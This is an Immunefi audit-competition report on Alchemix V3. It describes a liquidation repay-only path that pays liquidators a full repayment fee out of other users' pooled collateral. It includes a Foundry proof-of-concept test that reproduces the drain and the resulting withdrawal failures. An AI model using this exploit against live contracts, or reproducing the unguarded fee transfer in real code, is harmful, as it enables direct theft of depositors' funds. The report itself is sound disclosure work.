# 56519 sc critical unchecked repayment fee transfer in liquidate pays liquidators from other users collateral

**Submitted on Oct 17th 2025 at 08:02:00 UTC by @yesofcourse for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56519
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The liquidation flow’s **repay-only** path pays a **repayment fee** to the liquidator **without clamping the actual token transfer** to what the victim funded.

If the account’s residual collateral is insufficient to cover the computed fee, the contract **still transfers the entire fee** from its own MYT balance, effectively stealing other users’ collateral.

Attackers can loop across positions to extract value until pool balances are impaired, causing withdrawals to revert and risking insolvency.

## Vulnerability Details

**Where:** `AlchemistV3._liquidate` (repay-only branches) together with `_resolveRepaymentFee`.

**What happens:**

* `_liquidate` calls `_forceRepay` and then, in the **repay-only** outcomes (debt cleared or ratio restored), computes a `feeInYield` and **always** executes

  ```solidity
  TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
  ```
* `_resolveRepaymentFee(accountId, repaidAmountInYield)` computes:

  ```solidity
  fee = repaidAmountInYield * repaymentFee / BPS;
  // only deducts up to the account’s remaining collateral
  account.collateralBalance -= (fee > account.collateralBalance ? account.collateralBalance : fee);
  return fee; // returns the FULL fee, not the deducted amount
  ```

  This function **does not transfer** tokens; it only adjusts internal accounting. It returns the **full fee**, even if only a portion was deducted from the victim’s `collateralBalance`.

**Why it’s a bug:** Back in `_liquidate`, the unconditional `safeTransfer(..., feeInYield)` pulls tokens from the **contract’s MYT balance**. When the victim couldn’t cover the whole fee, the **shortfall is paid out of the pool**, i.e., from other users’ collateral. In contrast, the “true liquidation” path *does* guard the transfer (only pays if the account can fund it). The **repay-only** path lacks this guard.

## Impact Details

**Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

The liquidator receives tokens that are **not funded by the victim**; the deficit is covered by the contract’s MYT holdings that back **other users’** deposits. This is an immediate, extractable gain for the attacker and a direct loss for users.

* **Withdrawal failures / service disruption:** As pool balances are drained by fee shortfalls, users attempting to withdraw may revert.
* **Protocol insolvency risk:** Repeated exploitation can create a growing solvency hole (assets < liabilities), threatening system safety.

**Estimated loss:**

* Per liquidation: roughly `min(repaidAmountInYield * feeBps/BPS - residualCollateral, fee)` taken from pooled funds.
* Over many accounts or repeated cycles, the attacker can drain a material portion of the pool’s MYT buffer.

## References

* `AlchemistV3._liquidate(...)` — repay-only branches unconditionally transfer `feeInYield`: <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L826> <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L840>
* `AlchemistV3._resolveRepaymentFee(...)` — returns **full** fee while deducting **at most** the victim’s remaining `collateralBalance`.: <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L903>

## Proof of Concept

## Proof of Concept

* Configure 10% repayment fee; healthy user deposits; victim deposits and mints at 100% LTV; a matured redemption earmarks the victim’s entire debt; tweak min-collateralization to make the position liquidatable **without** needing seizure (repay-only).
* Call `liquidate(victimId)` and observe:
  * Liquidator receives the full `feeInYield`.
  * The Alchemist’s MYT balance drops by **(earmarked repayment + feeInYield)**.
  * Victim’s collateral covers only the repayment; the **extra fee** came from the **pool**.
  * A healthy user’s full withdrawal then **reverts** due to the shortfall; withdrawing a fee-adjusted amount succeeds.

The attached Foundry test `testLiquidate_RepayOnly_Fee_Overpays_From_Pool()` demonstrates this end-to-end: pool loss equals `assets + feeInYield`, healthy user’s full withdrawal fails, and a shortfall-adjusted withdrawal passes.

Paste this test in `test/AlchemistV3.t.sol` and run with `forge test --match-test testLiquidate_RepayOnly_Fee_Overpays_From_Pool`:

```solidity
    function testLiquidate_RepayOnly_Fee_Overpays_From_Pool() external {
        // --- Configure for a clean PoC: 100% LTV minting, 10% repayment fee, no protocol fee ---
        vm.startPrank(alOwner);
        alchemist.setProtocolFee(0);
        alchemist.setRepaymentFee(1000); // 10%
        alchemist.setCollateralizationLowerBound(FIXED_POINT_SCALAR); // 1.0
        alchemist.setMinimumCollateralization(FIXED_POINT_SCALAR);    // 1.0
        vm.stopPrank();

        // --- Healthy account deposits (no debt) ---
        uint256 healthyDeposit = 1_000e18;
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), healthyDeposit);
        alchemist.deposit(healthyDeposit, yetAnotherExternalUser, 0);
        uint256 healthyId = AlchemistNFTHelper.getFirstTokenId(yetAnotherExternalUser, address(alchemistNFT));
        vm.stopPrank();

        // --- Victim deposits and mints at 100% LTV (collateral == debt in 1.0x world) ---
        uint256 victimDeposit = 200e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), victimDeposit);
        alchemist.deposit(victimDeposit, address(0xbeef), 0);
        uint256 victimId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        uint256 maxBorrowable = alchemist.getMaxBorrowable(victimId);
        alchemist.mint(victimId, maxBorrowable, address(0xbeef));
        vm.stopPrank();

        // Fully earmark the victim's entire debt via a matured redemption
        vm.startPrank(address(0xdad));
        deal(address(alToken), address(0xdad), maxBorrowable);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxBorrowable);
        transmuterLogic.createRedemption(maxBorrowable);
        vm.stopPrank();

        // Let the redemption fully mature
        vm.roll(block.number + 5_256_000);

        // Make the position liquidatable without changing prices: raise min. collateralization > 1.0
        vm.prank(alOwner);
        alchemist.setMinimumCollateralization(1_050_000_000_000_000_000); // 1.05x

        // --- Snapshot pre-liquidation state ---
        uint256 alchemistSharesBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        (uint256 vicCollBefore, uint256 vicDebtBefore, uint256 vicEarmarkedBefore) = alchemist.getCDP(victimId);
        (uint256 healthyCollBefore,,) = alchemist.getCDP(healthyId);

        // Sanity: all victim debt is earmarked
        assertApproxEqAbs(vicEarmarkedBefore, vicDebtBefore, 1);

        // --- Liquidate: this path should do "repay-only" (forceRepay earmarked debt) and charge repayment fee ---
        vm.startPrank(externalUser);
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(victimId);
        vm.stopPrank();

        // --- Post-liquidation expectations ---
        uint256 alchemistSharesAfter = IERC20(address(vault)).balanceOf(address(alchemist));

        // Assets paid by the pool for the earmarked repay equals debt (in yield units)
        uint256 expectedAssets = alchemist.convertDebtTokensToYield(vicDebtBefore);
        // Repayment fee paid to the liquidator in yield tokens
        uint256 expectedFeeInYield = expectedAssets * alchemist.repaymentFee() / BPS;

        assertApproxEqAbs(assets, expectedAssets, 1);
        assertApproxEqAbs(feeInYield, expectedFeeInYield, 1);
        assertEq(feeInUnderlying, 0);

        // Victim should be fully cleared (no debt, no earmark). Collateral should be ~0.
        (uint256 vicCollAfter, uint256 vicDebtAfter, uint256 vicEarmarkedAfter) = alchemist.getCDP(victimId);
        assertEq(vicDebtAfter, 0);
        assertEq(vicEarmarkedAfter, 0);
        assertApproxEqAbs(vicCollAfter, 0, 1);

        // The Alchemist's MYT balance dropped by (earmarked repayment + repayment fee).
        // Because the victim's whole collateral == earmarked repayment, the EXTRA fee had to come from the pool.
        uint256 poolLoss = alchemistSharesBefore - alchemistSharesAfter;
        assertApproxEqAbs(poolLoss, assets + feeInYield, 1);

        // Healthy user's recorded collateral stayed the same …
        (uint256 healthyCollAfter,,) = alchemist.getCDP(healthyId);
        assertEq(healthyCollAfter, healthyCollBefore);

        // …but attempting to withdraw the full recorded amount should now fail due to the pool shortfall.
        vm.startPrank(yetAnotherExternalUser);
        vm.expectRevert(); // any revert is fine for the PoC
        alchemist.withdraw(healthyCollAfter, yetAnotherExternalUser, healthyId);
        vm.stopPrank();

        // Withdrawing the "shortfall-adjusted" amount should succeed.
        // Using a small safety margin for rounding in case of off-by-1 wei conversions.
        uint256 canWithdraw = healthyCollAfter - feeInYield - 1;
        vm.startPrank(yetAnotherExternalUser);
        uint256 withdrawn = alchemist.withdraw(canWithdraw, yetAnotherExternalUser, healthyId);
        vm.stopPrank();
        assertApproxEqAbs(withdrawn, canWithdraw, 1);
}
```
